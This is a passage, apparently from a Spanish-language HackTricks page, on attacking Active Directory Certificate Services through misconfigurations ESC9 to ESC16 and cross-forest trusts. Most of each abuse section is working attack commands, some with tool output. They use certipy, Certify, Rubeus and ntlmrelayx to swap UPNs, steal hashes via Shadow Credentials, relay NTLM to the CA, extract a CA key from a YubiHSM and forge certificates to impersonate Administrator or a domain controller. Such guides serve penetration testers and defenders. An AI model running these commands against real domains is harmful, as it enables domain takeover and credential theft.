certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Se observa que el `userPrincipalName` del certificado refleja `Administrator`, desprovisto de cualquier “object SID”.

El `userPrincipalName` de `Jane` se revierte entonces a su valor original, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Intentar la autenticación con el certificado emitido ahora devuelve el hash NT de `Administrator@corp.local`. El comando debe incluir `-domain <domain>` debido a que el certificado no especifica el dominio:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Mapeos de Certificados Débiles - ESC10

### Explicación

Dos valores de clave del registro en el domain controller son referidos por ESC10:

- El valor predeterminado para `CertificateMappingMethods` bajo `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` es `0x18` (`0x8 | 0x10`), anteriormente establecido en `0x1F`.
- La configuración predeterminada para `StrongCertificateBindingEnforcement` bajo `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` es `1`, anteriormente `0`.

**Caso 1**

Cuando `StrongCertificateBindingEnforcement` está configurado como `0`.

**Caso 2**

Si `CertificateMappingMethods` incluye el bit `UPN` (`0x4`).

### Caso de abuso 1

Con `StrongCertificateBindingEnforcement` configurado como `0`, una cuenta A con permisos `GenericWrite` puede ser explotada para comprometer cualquier cuenta B.

Por ejemplo, teniendo permisos `GenericWrite` sobre `Jane@corp.local`, un atacante pretende comprometer `Administrator@corp.local`. El procedimiento refleja ESC9, permitiendo que se utilice cualquier plantilla de certificado.

Inicialmente, el hash de `Jane` se recupera usando Shadow Credentials, explotando el `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Posteriormente, el `userPrincipalName` de `Jane` se cambia a `Administrator`, omitiendo deliberadamente la parte `@corp.local` para evitar una violación de la restricción.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
A continuación, se solicita un certificado que habilita la autenticación de cliente como `Jane`, utilizando la plantilla predeterminada `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
El `userPrincipalName` de `Jane` se restaura a su valor original, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Al autenticarse con el certificado obtenido se obtendrá el NT hash de `Administrator@corp.local`, por lo que es necesario especificar el dominio en el comando, ya que el certificado no incluye los detalles del dominio.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Caso de abuso 2

Con la bandera de bit `UPN` en `CertificateMappingMethods` (`0x4`), una cuenta A con permisos `GenericWrite` puede comprometer cualquier cuenta B que carezca de la propiedad `userPrincipalName`, incluidas cuentas de máquina y el administrador de dominio integrado `Administrator`.

Aquí, el objetivo es comprometer a `DC$@corp.local`, empezando por obtener el hash de `Jane` a través de Shadow Credentials, aprovechando el `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
El `userPrincipalName` de `Jane` se establece entonces en `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Se solicita un certificado para autenticación de cliente como `Jane` usando la plantilla predeterminada `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
El `userPrincipalName` de `Jane` se restaura a su valor original después de este proceso.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Para autenticarse vía Schannel, se utiliza la opción `-ldap-shell` de Certipy, indicando el éxito de la autenticación como `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
A través del shell LDAP, comandos como `set_rbcd` permiten ataques Resource-Based Constrained Delegation (RBCD), comprometiendo potencialmente el controlador de dominio.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Esta vulnerabilidad también afecta a cualquier cuenta de usuario que carezca de un `userPrincipalName` o en la que este no coincida con el `sAMAccountName`, siendo la cuenta por defecto `Administrator@corp.local` un objetivo principal debido a sus privilegios LDAP elevados y a la ausencia de un `userPrincipalName` por defecto.

## Relaying NTLM to ICPR - ESC11

### Explicación

If CA Server Do not configured with `IF_ENFORCEENCRYPTICERTREQUEST`, it can be makes NTLM relay attacks without signing via RPC service. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Puedes usar `certipy` para enumerar si `Enforce Encryption for Requests` está Disabled y certipy mostrará las vulnerabilidades `ESC11`.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Escenario de abuso

Es necesario configurar un servidor relay:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Nota: Para domain controllers, debemos especificar `-template` en DomainController.

O usando [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Explanation

Los administradores pueden configurar la Autoridad de Certificación para almacenarla en un dispositivo externo como el "Yubico YubiHSM2".

Si un dispositivo USB está conectado al servidor CA a través de un puerto USB, o a un USB device server en caso de que el servidor CA sea una virtual machine, se requiere una authentication key (a veces denominada "password") para que el Key Storage Provider genere y utilice claves en el YubiHSM.

Esta key/password se almacena en el registro bajo `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` en cleartext.

Referencia en [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Abuse Scenario

Si la private key de la CA está almacenada en un dispositivo USB físico cuando obtuviste shell access, es posible recuperar la clave.

En primer lugar, necesitas obtener el certificado de la CA (esto es público) y luego:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Finalmente, usa el comando certutil `-sign` para forjar un nuevo certificado arbitrario usando el certificado CA y su clave privada.

## OID Group Link Abuse - ESC13

### Explicación

El atributo `msPKI-Certificate-Policy` permite añadir la política de emisión a la plantilla de certificado. Los objetos `msPKI-Enterprise-Oid` responsables de emitir políticas pueden descubrirse en el Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) del contenedor PKI OID. Una política puede vincularse a un grupo AD usando el atributo `msDS-OIDToGroupLink` de este objeto, permitiendo que un sistema autorice a un usuario que presente el certificado como si fuera miembro del grupo. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

En otras palabras, cuando un usuario tiene permiso para inscribir un certificado y el certificado está vinculado a un grupo OID, el usuario puede heredar los privilegios de dicho grupo.

Usa [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) para encontrar OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Escenario de abuso

Encuentra un permiso de usuario que pueda usar con `certipy find` o `Certify.exe find /showAllPermissions`.

Si `John` tiene permiso para inscribir `VulnerableTemplate`, el usuario puede heredar los privilegios del grupo `VulnerableGroup`.

Todo lo que necesita hacer es especificar la plantilla; obtendrá un certificado con derechos OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Configuración vulnerable de renovación de certificados - ESC14

### Explicación

La descripción en https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping es notablemente completa. A continuación se cita el texto original.

ESC14 aborda vulnerabilidades derivadas de la "weak explicit certificate mapping", principalmente por el uso indebido o la configuración insegura del atributo `altSecurityIdentities` en cuentas de usuario o equipo de Active Directory. Este atributo multivalor permite a los administradores asociar manualmente certificados X.509 con una cuenta AD para propósitos de autenticación. Cuando está poblado, estos mapeos explícitos pueden reemplazar la lógica de mapeo de certificados por defecto, que típicamente se basa en UPNs o DNS names en el SAN del certificado, o en el SID incrustado en la extensión de seguridad `szOID_NTDS_CA_SECURITY_EXT`.

Un mapeo "débil" ocurre cuando el valor string usado dentro del atributo `altSecurityIdentities` para identificar un certificado es demasiado amplio, fácilmente adivinable, depende de campos no únicos del certificado, o utiliza componentes del certificado que son fáciles de falsificar. Si un atacante puede obtener o fabricar un certificado cuyos atributos coincidan con un mapeo explícito débilmente definido para una cuenta privilegiada, puede usar ese certificado para autenticarse e impersonar dicha cuenta.

Ejemplos de strings de mapeo potencialmente débiles en `altSecurityIdentities` incluyen:

- Mapeo únicamente por un Subject Common Name (CN) común: p. ej., `X509:<S>CN=SomeUser`. Un atacante podría obtener un certificado con ese CN desde una fuente menos segura.
- Uso de Issuer Distinguished Names (DNs) o Subject DNs demasiado genéricos sin más calificaciones como un número de serie específico o subject key identifier: p. ej., `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Empleo de otros patrones predecibles o identificadores no criptográficos que un atacante podría satisfacer en un certificado que pueda obtener legítimamente o forjar (si ha comprometido una CA o encontrado una plantilla vulnerable como en ESC1).

El atributo `altSecurityIdentities` soporta varios formatos para el mapeo, tales como:

- `X509:<I>IssuerDN<S>SubjectDN` (mapea por Issuer y Subject DN completos)
- `X509:<SKI>SubjectKeyIdentifier` (mapea por el valor de la extensión Subject Key Identifier del certificado)
- `X509:<SR>SerialNumberBackedByIssuerDN` (mapea por número de serie, implícitamente calificado por el Issuer DN) - esto no es un formato estándar, usualmente es `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (mapea por un nombre RFC822, típicamente un correo, desde el SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (mapea por un hash SHA1 de la raw public key del certificado - generalmente fuerte)

La seguridad de estos mapeos depende en gran medida de la especificidad, unicidad y fortaleza criptográfica de los identificadores de certificado elegidos en el string de mapeo. Incluso con modos de enlace de certificados fuertes habilitados en los Domain Controllers (que afectan principalmente a los mapeos implícitos basados en SAN UPNs/DNS y la extensión SID), una entrada `altSecurityIdentities` mal configurada aún puede presentar una vía directa para la suplantación si la lógica de mapeo en sí es defectuosa o demasiado permisiva.

### Escenario de abuso

ESC14 se dirige a los **explicit certificate mappings** en Active Directory (AD), específicamente al atributo `altSecurityIdentities`. Si este atributo está establecido (por diseño o por misconfiguración), los atacantes pueden suplantar cuentas presentando certificados que coincidan con el mapeo.

#### Scenario A: Attacker Can Write to `altSecurityIdentities`

**Precondición**: El atacante tiene permisos de escritura sobre el atributo `altSecurityIdentities` de la cuenta objetivo o el permiso para otorgarlo en la forma de uno de los siguientes permisos sobre el objeto AD objetivo:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### Scenario B: Target Has Weak Mapping via X509RFC822 (Email)

- **Precondición**: El objetivo tiene un mapeo X509RFC822 débil en altSecurityIdentities. Un atacante puede establecer el atributo mail de la víctima para que coincida con el nombre X509RFC822 del objetivo, solicitar/inscribirse por un certificado como la víctima y usarlo para autenticarse como el objetivo.

#### Scenario C: Target Has X509IssuerSubject Mapping

- **Precondición**: El objetivo tiene un mapeo explícito X509IssuerSubject débil en `altSecurityIdentities`. El atacante puede establecer el atributo `cn` o `dNSHostName` en un principal víctima para que coincida con el subject del mapeo X509IssuerSubject del objetivo. Luego, el atacante puede inscribirse por un certificado como la víctima y usar ese certificado para autenticarse como el objetivo.

#### Scenario D: Target Has X509SubjectOnly Mapping

- **Precondición**: El objetivo tiene un mapeo explícito X509SubjectOnly débil en `altSecurityIdentities`. El atacante puede establecer el atributo `cn` o `dNSHostName` en un principal víctima para que coincida con el subject del mapeo X509SubjectOnly del objetivo. Luego, el atacante puede inscribirse por un certificado como la víctima y usar ese certificado para autenticarse como el objetivo.

### operaciones concretas
#### Escenario A

Solicitar un certificado de la plantilla de certificado `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Guardar y convertir el certificado
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Autenticar (usando el certificado)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Limpieza (opcional)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Para métodos de ataque más específicos en varios escenarios de ataque, consulte lo siguiente: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Explanation

La descripción en https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc es notablemente completa. A continuación se cita el texto original.

Using built-in default version 1 certificate templates, an attacker can craft a CSR to include application policies that are preferred over the configured Extended Key Usage attributes specified in the template. The only requirement is enrollment rights, and it can be used to generate client authentication, certificate request agent, and codesigning certificates using the **_WebServer_** template

### Abuse

Lo siguiente hace referencia a [this link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Click to see more detailed usage methods.


El comando `find` de Certipy puede ayudar a identificar plantillas V1 que potencialmente son susceptibles a ESC15 si la CA no está parcheada.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Escenario A: Suplantación directa vía Schannel

**Paso 1: Solicitar un certificado, inyectando la Application Policy "Client Authentication" y el UPN objetivo.** El atacante `attacker@corp.local` apunta a `administrator@corp.local` usando la plantilla "WebServer" V1 (que permite subject suministrado por el enrollee).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: La plantilla V1 vulnerable con "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Inyecta el OID `1.3.6.1.5.5.7.3.2` en la extensión Application Policies del CSR.
- `-upn 'administrator@corp.local'`: Establece el UPN en el SAN para la suplantación.

**Paso 2: Autenticarse mediante Schannel (LDAPS) usando el certificado obtenido.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Escenario B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Paso 1: Solicitar un certificado desde una plantilla V1 (con "Enrollee supplies subject"), inyectando la Application Policy "Certificate Request Agent".** Este certificado es para que el atacante (`attacker@corp.local`) se convierta en un enrollment agent. No se especifica un UPN para la identidad del atacante aquí, ya que el objetivo es la capacidad de agente.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Inyecta OID `1.3.6.1.4.1.311.20.2.1`.

**Paso 2: Usa el certificado "agent" para solicitar un certificado en nombre de un usuario privilegiado objetivo.** Esto es un paso ESC3-like, usando el certificado del Paso 1 como el certificado agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Paso 3: Autentícese como el usuario privilegiado usando el certificado "on-behalf-of".**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Security Extension Disabled on CA (Globally)-ESC16

### Explicación

**ESC16 (Elevación de privilegios por ausencia de la extensión szOID_NTDS_CA_SECURITY_EXT)** se refiere al escenario en el que, si la configuración de AD CS no obliga la inclusión de la extensión **szOID_NTDS_CA_SECURITY_EXT** en todos los certificados, un atacante puede explotarlo mediante:

1. Solicitar un certificado **sin SID binding**.

2. Usar este certificado **para autenticarse como cualquier cuenta**, por ejemplo, suplantando una cuenta de alto privilegio (p. ej., Domain Administrator).

También puedes consultar este artículo para aprender más sobre el principio detallado:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Abuso

Lo siguiente hace referencia a [this link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally), haz clic para ver métodos de uso más detallados.

Para identificar si el entorno de Active Directory Certificate Services (AD CS) es vulnerable a **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Paso 1: Leer el UPN inicial de la cuenta de la víctima (Opcional - para restauración).
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Paso 2: Actualiza el UPN de la cuenta de la víctima al `sAMAccountName` del administrador objetivo.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Paso 3: (Si es necesario) Obtener credenciales para la cuenta "víctima" (p. ej., mediante Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Paso 4: Solicite un certificado como el usuario "victim" desde _cualquier plantilla de client authentication adecuada_ (p. ej., "User") en la CA vulnerable a ESC16.** Debido a que la CA es vulnerable a ESC16, omitirá automáticamente la SID security extension del certificado emitido, independientemente de la configuración específica de la plantilla para esta extensión. Establezca la variable de entorno del caché de credenciales de Kerberos (comando de shell):
```bash
export KRB5CCNAME=victim.ccache
```
Luego solicita el certificado:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Paso 5: Revertir el UPN de la cuenta "victim".**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Paso 6: Autenticarse como el administrador objetivo.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Compromiso de bosques con certificados explicado en voz pasiva

### Ruptura de trusts entre bosques por CAs comprometidas

La configuración para la **inscripción entre bosques** se facilita bastante. El **certificado root CA** del bosque de recursos es **publicado en los bosques de cuentas** por los administradores, y los **certificados de Enterprise CA** del bosque de recursos son **añadidos a los contenedores `NTAuthCertificates` y AIA en cada bosque de cuentas**. Para aclarar, este arreglo otorga a la **CA en el bosque de recursos control completo** sobre todos los demás bosques para los que gestiona la PKI. Si esta CA fuese **comprometida por atacantes**, ellos podrían **forjar certificados para todos los usuarios** tanto del bosque de recursos como de los bosques de cuentas, rompiendo así la frontera de seguridad del bosque.

### Privilegios de inscripción otorgados a principales externas

En entornos multi-bosque, se requiere precaución con respecto a las Enterprise CAs que **publican plantillas de certificados** que permiten a **Authenticated Users o principales externas** (usuarios/grupos externos al bosque al que pertenece la Enterprise CA) **derechos de inscripción y edición**.\
Tras la autenticación a través de un trust, AD añade el **Authenticated Users SID** al token del usuario. Por tanto, si un dominio posee una Enterprise CA con una plantilla que **permite derechos de inscripción a Authenticated Users**, una plantilla podría potencialmente ser **inscrita por un usuario de un bosque diferente**. De igual forma, si **los derechos de inscripción son explícitamente concedidos a un principal externo por una plantilla**, se **crea así una relación de control de acceso entre bosques (cross-forest access-control relationship)**, permitiendo que un principal de un bosque **se inscriba en una plantilla de otro bosque**.

Ambos escenarios provocan un **aumento de la superficie de ataque** de un bosque a otro. Los ajustes de la plantilla de certificado podrían ser explotados por un atacante para obtener privilegios adicionales en un dominio externo.


## Referencias

- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
